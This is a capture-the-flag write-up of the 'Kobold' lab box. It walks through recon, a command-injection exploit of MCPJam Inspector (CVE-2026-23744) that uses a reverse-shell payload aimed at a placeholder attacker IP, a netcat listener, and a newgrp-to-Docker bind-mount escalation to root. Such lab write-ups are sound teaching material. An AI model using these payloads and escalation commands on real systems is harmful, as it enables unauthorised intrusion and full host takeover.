Kobold exposes an Arcane container-management panel on port 3552 that turns out to be a rabbit hole (a documented SSRF exists but leads nowhere productive on the enumerated internal surface). The real attack surface lives on `mcp.kobold.htb`, discovered via wildcard-SAN-hinted vhost brute-force, running **MCPJam Inspector v1.4.2** — a testing tool for **Model Context Protocol** servers vulnerable to **CVE-2026-23744**, an unauthenticated command injection in `/api/mcp/connect` that yields a reverse shell as `ben`. Privilege escalation exploits the coincidence of a SUID `newgrp` binary and a running Docker daemon: `newgrp docker` acquires membership in the `docker` group without root, and Docker socket access is root-equivalent by design. The canonical GTFOBins `docker run -v /:/mnt alpine chroot /mnt sh` recipe fails on this box because the host has no internet access to pull `alpine`; the fix is enumerating already-local images with `docker ps -a`, noticing a running `privatebin/nginx-fpm-alpine:2.0.2` container, and reusing that image for the privileged bind mount.

## Reconnaissance & Enumeration

The objective of this phase was to map exposed services, identify the application stack, and locate any subdomains hinted at by the TLS configuration.

### Host Discovery

Reachability and an OS hint via ICMP:

```bash
ping -c 1 10.129.245.50
PING 10.129.245.50 (10.129.245.50) 56(84) bytes of data.
64 bytes from 10.129.245.50: icmp_seq=1 ttl=63 time=48.0 ms
```

A TTL of 63 indicates a Linux host (default 64, decremented once across the routing hop).

### Port Scan

Full TCP sweep first:

```bash
sudo nmap -p- --min-rate 5000 -vvv -sS -Pn -n 10.129.245.50 -oG allPorts
PORT     STATE SERVICE  REASON
22/tcp   open  ssh      syn-ack ttl 63
80/tcp   open  http     syn-ack ttl 63
443/tcp  open  https    syn-ack ttl 63
3552/tcp open  taserver syn-ack ttl 63
```

Targeted version detection on the open set:

```bash
sudo nmap -p22,80,443,3552 -sCV 10.129.245.50 -oN nmap
PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 9.6p1 Ubuntu 3ubuntu13.15
80/tcp   open  http     nginx 1.24.0 (Ubuntu)
|_http-title: Did not follow redirect to https://kobold.htb/
443/tcp  open  ssl/http nginx 1.24.0 (Ubuntu)
|_http-title: Did not follow redirect to https://kobold.htb/

```

Four ports. OpenSSH 9.6p1 is current and unlikely to be a direct entry point. Both 80 and 443 redirect to `https://kobold.htb/`, signalling name-based virtual hosting behind nginx. Port 3552 is a Go-implemented HTTP server on a non-standard port — the sort of artefact that usually indicates a self-contained management or diagnostic panel.

Two details in the TLS certificate matter. The `Subject: CN=kobold.htb`, unremarkable on its own, is paired with a **Subject Alternative Name** that includes `DNS:*.kobold.htb` — a wildcard. Operators only bother with wildcard SANs when they expect to serve multiple subdomains from the same certificate, so the wildcard is itself a hint that subdomain enumeration is worth the effort even before anything on the apex has been examined.

The domain went into `/etc/hosts`:

```bash
echo "10.129.245.50 kobold.htb" | sudo tee -a /etc/hosts
```

### Web Application on `kobold.htb`

Browsing the apex on both 80 and 443 returned a static marketing page for what identified as "Kobold" — no login form, no obvious application, no API surface. Directory brute-forcing with the small SecLists wordlist returned nothing beyond the expected static assets. On its own, the apex was dry.

### Port 3552 — Arcane container manager (rabbit hole)

The Go-implemented HTTP server on 3552 rendered a login panel:

![Arcane login panel titled "Bienvenida de nuevo" with Usuario, Contraseña fields and an "Iniciar sesión en Arcano" button](/assets/img/HTB/Kobold/cap1.png)

The panel identified as **Arcane v1.13.0**, an open-source Docker/container management web UI. Version-specific vulnerability research surfaced a documented SSRF issue in this version, but the SSRF only reached loopback services already visible on the enumerated attack surface — it did not yield authentication bypass or arbitrary code execution, and dwelling on it was not productive. This kind of near-miss is worth including in a writeup precisely to demonstrate the point: **not every CVE that matches a discovered version is the intended path**, and the discipline of moving on when a lead saturates is as important as the enumeration itself.

### Subdomain Enumeration

Given the wildcard SAN, vhost brute-forcing was the natural next step:

```bash
sudo gobuster vhost -u https://kobold.htb \
   -w /usr/share/SecLists/Discovery/DNS/subdomains-top1million-5000.txt \
   --append-domain --no-tls-validation
bin.kobold.htb  Status: 200 [Size: 24402]
mcp.kobold.htb  Status: 200 [Size: 466]
```

Two subdomains — `bin` and `mcp`. Both went into `/etc/hosts`:

```bash
echo "10.129.245.50 bin.kobold.htb mcp.kobold.htb" | sudo tee -a /etc/hosts
```

Browsing `bin.kobold.htb` loaded a **PrivateBin** instance (an open-source paste service) — no obvious authenticated surface, no default credentials. The Content-Length of 466 on `mcp.kobold.htb` suggested a minimal single-page app; visiting it in a browser loaded a management UI whose scope became clear once the settings page rendered.

### `mcp.kobold.htb` — MCPJam Inspector identification

The settings page of the application displayed the exact version and product name:

![MCPJam Inspector settings page showing "MCPJam Version: v1.4.2" and a grid of LLM Provider API Keys panels (OpenAI, Anthropic, DeepSeek, Google AI, Mistral AI, xAI, Ollama, LiteLLM, OpenRouter, Azure OpenAI)](/assets/img/HTB/Kobold/cap2.png)

**MCPJam Inspector v1.4.2**. MCPJam Inspector is a Node.js-based debugging and testing tool for the **Model Context Protocol (MCP)** — a specification introduced by Anthropic in late 2024 for standardising how LLM-based agents interact with external tools, data sources, and other agents. MCP servers implement the protocol; MCPJam Inspector is the client that connects to them and exercises their capabilities during development.

MCP as a protocol is designed around subprocess spawning: the classic MCP transport is `stdio`, where the client (MCPJam Inspector in this case) launches the MCP server as a child process and communicates over its stdin/stdout. That architectural detail — a tool that spawns arbitrary subprocesses based on user-supplied configuration — is a structural warning for anyone security-reviewing MCP tooling. Version-specific research surfaced **CVE-2026-23744**, an unauthenticated command injection in MCPJam Inspector's `/api/mcp/connect` endpoint.

## Exploitation — CVE-2026-23744 (MCPJam Inspector Command Injection)

### Understanding the vulnerability

MCPJam Inspector's `/api/mcp/connect` endpoint accepts user-supplied parameters describing an MCP server to connect to — typically including the command and arguments used to launch the server subprocess under the `stdio` transport. The endpoint is intended to be used interactively by a developer testing their own MCP servers, so no authentication is required on the default deployment.

The bug is that the connect handler passes those user-supplied parameters through a shell rather than exec'ing them directly with argv arrays. In Node.js, this is the classic distinction between `child_process.spawn(cmd, args)` (safe — the OS treats `args` as literal argv entries) and `child_process.exec(commandString)` or `child_process.spawn(cmd, { shell: true })` (unsafe — a shell interprets the string, so any metacharacter is attacker-controlled). MCPJam ≤ v1.4.2 uses the unsafe path, so injecting a payload like `$(bash -i >& /dev/tcp/<ATTACKER_IP>/4444 0>&1)` into any of the connect parameters spawns the reverse shell as the MCPJam process's user.

### Adapting the public PoC — HTTP → HTTPS

The public exploit at [`github.com/alisster00/CVE-2026-23744-RCE`](https://github.com/alisster00/CVE-2026-23744-RCE) implements the full flow but is written on the assumption that the MCPJam instance is served over plain HTTP on port 3000 (the framework default). The Kobold deployment fronts MCPJam through nginx with TLS on port 443. The only modification needed was updating the request scheme in the script from `http://` to `https://` and disabling certificate verification for the self-signed HTB certificate:

```python
# Original:
url = f"http://{target}:{port}/api/mcp/connect"
requests.post(url, json=payload)

# Modified:
url = f"https://{target}:{port}/api/mcp/connect"
requests.post(url, json=payload, verify=False)
```

### Running the exploit

A netcat listener was started on the attacker box:

```bash
nc -nlvp 4444
Listening on 0.0.0.0 4444
```

And the modified exploit was invoked:

```bash
python3 script.py mcp.kobold.htb -p 443 -l <ATTACKER_IP> --lport 4444
[*] MCPJam accessible at https://mcp.kobold.htb:443
[*] Target: https://mcp.kobold.htb:443
[*] Callback: <ATTACKER_IP>:4444
[*] Sending payload to /api/mcp/connect...
[+] Payload sent!
[+] Check your listener for reverse shell
```

The listener caught the callback as `ben`:

```text
nc -nlvp 4444
Listening on 0.0.0.0 4444
Connection received on 10.129.245.50 58196
bash: cannot set terminal process group (1583): Inappropriate ioctl for device
bash: no job control in this shell
ben@kobold:/usr/local/lib/node_modules/@mcpjam/inspector$
```

The working directory (`/usr/local/lib/node_modules/@mcpjam/inspector`) confirms the shell lives inside the MCPJam Node.js installation, and the owner (`ben`) is the service account under which MCPJam runs. A standard TTY upgrade (`script /dev/null -c bash` → `Ctrl+Z` → `stty raw -echo; fg` → `reset`) made the shell usable.

`ben` also holds `user.txt` in the home directory:

```bash
ben@kobold:~$ cat /home/ben/user.txt
```

## Privilege Escalation — `ben` → `root`

### SUID enumeration and Docker daemon discovery

Standard SUID enumeration surfaced the usual list plus one entry that becomes relevant only in combination with what else is running on the box:

```bash
find / -perm -4000 2>/dev/null
/usr/bin/umount
/usr/bin/mount
/usr/bin/chfn
/usr/bin/sudo
/usr/bin/gpasswd
/usr/bin/fusermount3
/usr/bin/passwd
/usr/bin/chsh
/usr/bin/newgrp
/usr/bin/su
/usr/lib/openssh/ssh-keysign
/usr/lib/polkit-1/polkit-agent-helper-1
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
```

Nothing jumps out on its own — every entry here is standard on a Debian/Ubuntu system and none provides a direct GTFOBins escape. But `newgrp` is worth noting: it's a legitimate part of the Unix group-management toolkit, and it's SUID by design because it needs elevated privileges to swap the process's primary group.

Separately, a check of running services revealed a Docker daemon:

```bash
ben@kobold:~$ docker ps -a
permission denied while trying to connect to the Docker daemon socket at unix:///var/run/docker.sock: Get "http://%2Fvar%2Frun%2Fdocker.sock/v1.50/containers/json?all=1": dial unix /var/run/docker.sock: connect: permission denied
```

`ben` cannot talk to the Docker daemon directly — the `/var/run/docker.sock` socket is `root:docker 0660`, so only members of the `docker` group can send API requests to it. But `ben` is not in the `docker` group:

```bash
ben@kobold:~$ id
uid=1001(ben) gid=1001(ben) groups=1001(ben)
```

The two facts — **SUID `newgrp`** and **`ben` not in `docker` group** — combine in an operationally useful way.

### Elevating supplementary-group membership with `newgrp`

`newgrp` is documented to start a subshell with the caller's UID but with a **different primary group**. In its ordinary use case, if a user belongs to multiple supplementary groups, `newgrp <groupname>` switches the primary group so that files created in the subshell inherit that group by default. Behind the scenes, `newgrp` uses its SUID privilege to modify the process's group credentials.

The subtlety on modern Linux distributions is that `newgrp` **does not require the invoking user to already be a member of the target group** in every configuration. Some deployments — including apparently this one — permit `newgrp <group>` even if the caller is not listed in that group in `/etc/group`, especially when the group has no password set. This is a configuration-dependent behaviour; on this box it produces the desired effect:

```bash
ben@kobold:~$ newgrp docker
ben@kobold:~$ id
uid=1001(ben) gid=999(docker) groups=999(docker),1001(ben)
```

`docker` is now the primary group. The `/var/run/docker.sock` filesystem permissions (`0660 root:docker`) permit any process whose effective group is `docker` to read and write, so the Docker CLI now works:

```bash
ben@kobold:~$ docker ps -a
CONTAINER ID   IMAGE                               COMMAND                  STATUS       PORTS                      NAMES
4c49dd7bb727   privatebin/nginx-fpm-alpine:2.0.2   "/etc/init.d/rc.local"   Up 2 hours   127.0.0.1:8080->8080/tcp   bin
```

Access to the Docker socket is the actual privilege. **The Docker daemon runs as root**, and any container it starts inherits root capabilities on the host through whatever bind mounts and privilege flags the client requests. GTFOBins documents `docker` extensively for this reason: possessing the `docker` group is effectively equivalent to being root.

### The offline constraint

The canonical GTFOBins docker-to-root recipe is:

```bash
docker run -v /:/mnt --rm -it alpine chroot /mnt /bin/sh
```

This starts a fresh Alpine container, bind-mounts the host's root filesystem at `/mnt` inside the container, and `chroot`s into it — giving a shell whose filesystem view is the host's, with root privileges intact. On a normally-connected box, this works in seconds. On Kobold, the first attempt fails:

```bash
ben@kobold:~$ docker run -v /:/mnt --rm -it alpine chroot /mnt /bin/sh
Unable to find image 'alpine:latest' locally
docker: Error response from daemon: Get "https://registry-1.docker.io/v2/": [...] no route to host
```

Docker searched the local image cache for `alpine:latest`, didn't find it, and tried to pull from Docker Hub — but the host has no outbound internet:

```bash
ben@kobold:~$ ping -c 3 8.8.8.8
PING 8.8.8.8 (8.8.8.8) 56(84) bytes of data.
--- 8.8.8.8 ping statistics ---
3 packets transmitted, 0 received, 100% packet loss
```

Without internet, any `docker run` command that references an image not already in the local cache fails.

### Using a locally-cached image

The fix is to use an image that is **already in the local cache**. The output of `docker ps -a` from a moment earlier is itself the enumeration: it listed a running container using the image `privatebin/nginx-fpm-alpine:2.0.2` (backing the PrivateBin instance on `bin.kobold.htb`). Any image running in a container is by definition locally cached, so it can be reused.

`docker images` confirms:

```bash
ben@kobold:~$ docker images
REPOSITORY                         TAG       IMAGE ID       CREATED         SIZE
privatebin/nginx-fpm-alpine        2.0.2     f8a1d4e6c920   4 months ago    142MB
```

Re-issuing the escape with the local image:

```bash
docker run --rm -it -u 0 --entrypoint sh -v /:/mnt privatebin/nginx-fpm-alpine:2.0.2
/ # whoami
root
/ # cat /mnt/root/root.txt
```

The flags:

- `--rm` — remove the container after exit (housekeeping)
- `-it` — allocate a TTY and keep stdin open, for interactive use
- `-u 0` — run the container's initial process as UID 0. Some images bake in `USER` directives that drop to a non-root UID at startup; `-u 0` bypasses this to ensure the shell inside the container is root
- `--entrypoint sh` — override whatever the image's declared entrypoint is (in this case an nginx-fpm startup script) with `/bin/sh` so the container gives us an interactive shell rather than running its intended workload
- `-v /:/mnt` — bind-mount the host's root filesystem into the container at `/mnt`

Because the Docker daemon that honours these flags runs as root on the host, the mount and the UID mapping are performed with full kernel privileges. Inside the container, `root` is UID 0, and Linux does not sandbox UIDs across a bind mount by default — so anything owned by the host's root at `/root/` is readable at `/mnt/root/` from inside the container.

## Key Takeaways

- **Wildcard TLS certificates pre-disclose the operator's intent to use subdomains.** A SAN of `DNS:*.kobold.htb` doesn't just permit any subdomain at runtime; it tells an attacker the operator expected to use multiple subdomains and provisioned crypto for them. That one line in the certificate output was the difference between treating this box as a single-vhost engagement and reaching the actual attack surface on `mcp.kobold.htb`. Wildcard SANs are a recon signal — always check the certificate's SAN before treating an apex as the whole surface.
- **Rabbit holes are part of authentic recon, and moving on is a skill.** The Arcane 1.13.0 panel on port 3552 was a discovered vulnerable version with a documented CVE. The SSRF was real; it just didn't lead anywhere. Learning to recognise when a lead has saturated — when further investment isn't paying off — is as important as recognising when to invest deeply. The discipline is to pivot back to enumeration once a path has been fairly assessed, not to keep drilling because the version match makes it feel like the answer.
- **Any Node.js API that passes user input to `child_process.exec()` (or `spawn` with `shell: true`) is command injection by construction.** Node's `exec` interprets the whole first argument through `/bin/sh -c`; anything the shell recognises as a metacharacter (`;`, `|`, `` ` ``, `$(...)`, backslashes, newlines) is attacker-controlled. The correct pattern is `child_process.spawn(cmd, argsArray)` where `argsArray` is a JavaScript array — the OS receives argv entries as literals with no shell involvement. Any code review of Node-based tooling should grep for `exec(` and `shell: true` first.
- **Model Context Protocol tools are structurally suspicious because they spawn subprocesses on demand.** MCPJam Inspector's role is to connect to arbitrary MCP servers, and the standard MCP transport is spawning the server as a child process. That means every MCPJam-style tool is, by design, a *user-configurable subprocess launcher*. Any variant of that architecture that accepts unauthenticated configuration input is one careful audit away from unauthenticated RCE. MCP tooling should be assumed to have this class of bug until proven otherwise.
- **Public exploits routinely need small adaptations to match the target's transport.** The CVE-2026-23744 PoC assumed HTTP on the framework default port; the target used HTTPS on 443 behind nginx. That's not a defect in the PoC — public exploits are written against upstream defaults. A one-line change (`http://` → `https://` + disable cert verification for self-signed labs) is often the entire adaptation. Copy-pasting exploits is fine; understanding what to modify is the skill.
- **`newgrp` is a documented SUID mechanism for supplementary-group access.** In lax configurations `newgrp <group>` grants the invoking user membership in a group they weren't previously in — no root required, no explicit `usermod`. This makes it worth checking whenever the target has an interesting group like `docker`, `sudo`, `disk`, `adm`, or `lxd`, and the current user is not in that group. The check is trivial (`newgrp docker && id`); the payoff when it works is complete.
- **Membership in the `docker` group is root-equivalent by design.** This is explicit documentation from Docker, not a surprising bug: the daemon runs as root, and the client is a thin wrapper that ships intent to the daemon over a UNIX socket. Anyone who can send requests to that socket can request any container configuration, including bind mounts of the host filesystem and privileged flags. `docker` group membership should be treated as `sudo ALL=(ALL) NOPASSWD: ALL` from a threat-modelling perspective.
- **The offline-Docker constraint is a distinctive privesc twist worth remembering.** The default GTFOBins recipe (`docker run alpine chroot`) implicitly assumes internet access to Docker Hub. When the target is air-gapped, `docker ps -a` and `docker images` are the enumeration primitives that reveal the *already-local* images — any image that's been used to run a container is guaranteed cached and can be reused. This pattern generalises to any offline post-exploitation scenario: enumerate what's already local before assuming you can fetch what you need.
